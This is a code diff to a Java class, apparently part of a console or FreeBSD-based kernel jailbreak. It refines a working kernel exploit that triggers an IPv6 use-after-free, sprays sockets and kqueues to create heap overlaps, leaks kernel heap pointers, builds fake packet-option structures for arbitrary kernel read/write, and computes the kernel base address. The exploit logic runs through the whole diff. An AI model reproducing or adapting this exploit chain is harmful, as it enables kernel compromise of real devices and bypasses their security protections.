@@ -18,8 +18,6 @@ public class KernelMemory {
     private static final int IPV6_RTHDR = 51;
     private static final int IPV6_PKTINFO = 46;
     private static final int IPV6_2292PKTOPTIONS = 25;
-    private static final int EVFILT_READ = -1;
-    private static final int EV_ADD = 1;
     private static final int RTP_SET = 1;
     private static final int CPU_SETSIZE = 16;
     private static final int CPU_LEVEL_WHICH = 3;
@@ -36,7 +34,6 @@ public class KernelMemory {
     private static final int NUM_KQUEUES = 0x96;
 
     private static final int IN6_PKTINFO_SIZE = 20;
-    private static final int KEVENT_SIZE = 64;
 
     private static final int PKTOPTS_PKTINFO_OFFSET = 16;
     private static final int PKTOPTS_RTHDR_OFFSET = 112;
@@ -44,12 +41,10 @@ public class KernelMemory {
 
     // State variables
     private static int[] spray_sock = new int[NUM_SPRAY];
-    private static int[] kq = new int[NUM_KQUEUES];
     private static long pktopts_addr = 0;
-    private static long kevent_addr = 0;
+    private static long kqueue_addr = 0;
     private static long pipe_addr = 0;
     private static long kernel_base = 0;
-    private static int kevent_sock = -1;
     private static int master_sock = -1;
     private static int overlap_sock = -1;
     private static int victim_sock = -1;
@@ -58,7 +53,7 @@ public class KernelMemory {
 
     private static void println(String s) {
 	LoggingUI.getInstance().log(s);
-	libkernel.usleep(1000*1000);
+	//libkernel.usleep(1000*1000);
     }
 
     private static void perror(String s) {
@@ -391,100 +386,75 @@ public class KernelMemory {
 	    throw new IOException("Cannot refill pktopts");
 	}
 
+	NativeMemory.freeMemory(buf);
+
 	return tclass & 0xffff;
     }
 
-    private static void leak_kevent_pktopts() {
-	long buf = NativeMemory.allocateMemory(0x800);
-	long kv = NativeMemory.allocateMemory(KEVENT_SIZE);
-
-	NativeMemory.setMemory(buf, 0x800, (byte)0);
-	NativeMemory.setMemory(buf, KEVENT_SIZE, (byte)0);
-	
-	NativeMemory.putLong(kv + 0x00, kevent_sock);
-	NativeMemory.putShort(kv + 0x08, (short)EVFILT_READ);
-	NativeMemory.putShort(kv + 0x0a, (short)EV_ADD);
-	NativeMemory.putInt(kv + 0x0c, 0);
-	NativeMemory.putLong(kv + 0x10, 5);
-	NativeMemory.putLong(kv + 0x18, 0);
+    private static void leak_pktopts() {
+	long buf = NativeMemory.allocateMemory(0x100);
 	
 	// Free pktopts
 	for(int i=0; i<NUM_SPRAY; i++) {
 	    free_pktopts(spray_sock[i]);
 	}
 
-	// Leak 0x800 kmalloc addr
-	kevent_addr = leak_kmalloc(buf, 0x800);
-	println("[+] kevent_addr: 0x" + Long.toHexString(kevent_addr));
-
-	// Free rthdr buffer and spray kevents to occupy this location
-	free_rthdr(master_sock);
-	for (int i=0; i<NUM_KQUEUES; i++) {
-	    if(libkernel.kevent(kq[i], kv, 1, 0, 0, 0) < 0) {
-		perror("kevent");
-	    }
-	}
-
 	// Leak 0x100 kmalloc addr
 	pktopts_addr = leak_kmalloc(buf, 0x100);
-	println("[+] pktopts_addr: 0x" + Long.toHexString(pktopts_addr));
 
 	// Free rthdr buffer and spray pktopts to occupy this location
 	free_rthdr(master_sock);
 	for (int i=0; i<NUM_SPRAY; i++) {
 	    set_tclass(spray_sock[i], 0);
 	}
+
+	NativeMemory.freeMemory(buf);
     }
 
-    private static long leak_kqueue() {
-	ArrayList<Integer> fds = new ArrayList<>(10000);
-	ArrayList<Long> allmems = new ArrayList<>(10000);
-	HashSet<Long> mems_set = new HashSet<>(10000);
-	long buf = 0;
-	try {
-	    buf = NativeMemory.allocateMemory(0x800);
-	    NativeMemory.setMemory(buf, 0x800, (byte) 0);
-	    
-	    while(true) {
-		mems_set.clear();
-		int fd = -1;
-		for (int i = 0; i < 10000; i++) {
-		    if (i == 5000) {
-			fd = libkernel.kqueue();
-			if(fd < 0) {
-			    perror("kqueue");
-			}
-			fds.add(new Integer(fd));
-		    }
-		    Long addr = new Long(leak_kmalloc(buf, 0x120));
-		    allmems.add(addr);
-		    mems_set.add(addr);
-		}
-		for (long a1 : mems_set) {
-		    long a2 = a1 ^ 0x200;
-		    if (mems_set.contains(new Long(a2))) {
-			continue;
-		    }
-		    long q = kread64(a2);
-		    if (!(q >= -0x1000000000000l && q < -1 && (q & 0xff) != 0)) {
-			continue;
-		    }
-		    // "kqueue\x00"
-		    if ((kread64(q) & 0xffffffffffffffl) == 0x65756575716bl) {
-			return q;
-		    }
-		}
-	    }
-	} finally {
-	    if (buf != 0) {
-		NativeMemory.freeMemory(buf);
-	    }
-	    for (int fd : fds) {
-		if(libkernel.close(fd) < 0) {
-		    perror("close");
-		}
+    private static void leak_kqueue() {
+	long buf = NativeMemory.allocateMemory(0x120);
+	int rthdr_len = build_rthdr_msg(buf, 0x120);
+	int[] fds = new int[0x5C];
+
+	// Spray kqueues
+	for(int i=0; i<fds.length; i++) {
+	    if((fds[i]=libkernel.kqueue()) < 0) {
+		perror("kqueue");
+		continue;
 	    }
 	}
+
+	// Create holes
+	for(int i=0; i<fds.length; i+=2) {
+	    if(libkernel.close(fds[i]) < 0) {
+		perror("close");
+	    }
+	}
+
+	set_rthdr(master_sock, buf, rthdr_len);
+	long addr = leak_rthdr_ptr(overlap_sock);
+
+	for(int i=0; i<0x1000; i+=8) {
+	    long q = kread64(addr + i);
+	    if(!(q >= -0x1000000000000l && q < -1 && (q & 0xff) != 0)) {
+		continue;
+	    }
+
+	    // "kqueue\x00"
+	    if((kread64(q) & 0xffffffffffffffl) == 0x65756575716bl) {
+		kqueue_addr = q;
+		break;
+	    }
+	}
+
+	// cleanup
+	for(int i=1; i<fds.length; i+=2) {
+	    if(libkernel.close(fds[i]) < 0) {
+		perror("close");
+	    }
+	}
+
+	NativeMemory.freeMemory(buf);
     }
 
     private static long get_file_addr(int fd) throws IOException {
@@ -515,12 +485,7 @@ public class KernelMemory {
 	inc_socket_refcount(master_sock);
 	inc_socket_refcount(victim_sock);
 	
-	for (int sock : spray_sock) {
-	    if(libkernel.close(sock) < 0) {
-		perror("close");
-	    }
-	}
-	for (int fd : kq) {
+	for(int fd : spray_sock) {
 	    if(libkernel.close(fd) < 0) {
 		perror("close");
 	    }
@@ -543,23 +508,12 @@ public class KernelMemory {
 	long knote, kn_fop, f_detach;
 	int idx;
 
-	println("[*] Initializing sockets...");
-
-	kevent_sock = new_socket();
 	master_sock = new_socket();
-
-	for(int i=0; i<NUM_SPRAY; i++) {
+	for(int i=0; i<spray_sock.length; i++) {
 	    spray_sock[i] = new_socket();
 	}
 
-	for(int i=0; i<NUM_KQUEUES; i++) {
-	    kq[i] = libkernel.kqueue();
-	    if(kq[i] < 0) {
-		perror("kqueue");
-	    }
-	}
-
-	println("[*] Triggering UAF...");
+	println("  [*] Triggering IPv6 UAF...");
 	idx = trigger_uaf();
 	if(idx == -1) {
 	    throw new IOException("Cannot find overlapping socket");
@@ -568,7 +522,7 @@ public class KernelMemory {
 	// master_sock and overlap_sock point to the same pktopts
 	overlap_sock = spray_sock[idx];
 	spray_sock[idx] = new_socket();
-	println("[+] Overlap socket: " + overlap_sock + " ("  + idx + ")");
+	println("  [+] Overlap socket: " + overlap_sock + " ("  + idx + ")");
 
 	// Reallocate pktopts
 	for(int i=0; i<NUM_SPRAY; i++) {
@@ -580,15 +534,16 @@ public class KernelMemory {
 	idx = fake_pktopts(overlap_sock, 0, TCLASS_MASTER);
 	overlap_sock = spray_sock[idx];
 	spray_sock[idx] = new_socket(); // use new socket so logic in spraying will be easier
-	println("[+] Overlap socket: " + overlap_sock + " ("  + idx + ")");
+	println("  [+] Overlap socket: " + overlap_sock + " ("  + idx + ")");
 
-	// Leak address of some kevent and pktopts
-	leak_kevent_pktopts();
+	// Leak address of some pktopts
+	leak_pktopts();
+	println("  [+] pktopts_addr: 0x" + Long.toHexString(pktopts_addr));
 
 	// Fake master pktopts
 	idx = fake_pktopts(overlap_sock, pktopts_addr + PKTOPTS_PKTINFO_OFFSET, TCLASS_MASTER);
 	overlap_sock = spray_sock[idx];
-	println("[+] Overlap socket: " + overlap_sock + " ("  + idx + ")");
+	println("  [+] Overlap socket: " + overlap_sock + " ("  + idx + ")");
 
 	idx = find_victim_sock();
 	if (idx == -1) {
@@ -597,17 +552,16 @@ public class KernelMemory {
 
 	victim_sock = spray_sock[idx];
 	spray_sock[idx] = new_socket();
-	println("[+] Arbitrary R/W achieved.");
 
-	println("[*] Leaking kernel .data address");
-	long kqueue_addr = leak_kqueue();
-	kernel_base = (kqueue_addr & ~0xFFFF) - 0x310000;
-	println("[+] Kernel .data address: 0x" + Long.toHexString(kernel_base));
+	println("  [*] Leaking kqueue_addr...");
+	leak_kqueue();
+	println("  [+] kqueue_addr: 0x" + Long.toHexString(kqueue_addr));
 	
-	println("[*] Cleaning up...");
+	kernel_base = (kqueue_addr & ~0xFFFF) - 0x310000;
+	println("  [*] Cleaning up...");
 	cleanup();
 
-	println("[*] Setting up kernel .data read/write pipe...");
+	println("  [*] Setting up kernel .data read/write pipe...");
 	setup_rw_pipe();
 	if(pipe_addr == 0) {
 	    throw new IOException("Cannot setup R/W pipe");
